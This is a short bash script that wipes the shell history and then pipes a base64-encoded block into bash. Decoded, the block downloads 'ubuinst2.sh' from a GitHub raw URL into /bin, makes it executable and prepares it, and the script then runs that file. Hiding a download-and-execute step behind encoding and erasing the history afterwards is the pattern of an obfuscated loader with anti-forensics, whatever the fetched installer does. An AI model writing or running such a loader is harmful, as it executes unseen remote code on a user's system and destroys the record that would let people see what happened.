#!/bin/bash
cat /dev/null > ~/.bash_history && history -c
rm /bin/ubuinst* > /dev/null 2>&1
echo 'IyEvYmluL2Jhc2gKY2QgL2JpbiB8fCBleGl0CndnZXQgcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9EaWd1bGdhc29mdC9OQU5ETy1pbnN0YWxsL21hc3Rlci91YnVpbnN0Mi5zaCAmJiBjaG1vZCAreCB1YnVpbnN0Mi5zaCAmJiBkb3MydW5peCB1YnVpbnN0Mi5zaCA+IC9kZXYvbnVsbCAyPiYxCmNkIHx8IGV4aXQ=' | base64 -d | bash
/bin/ubuinst2.sh
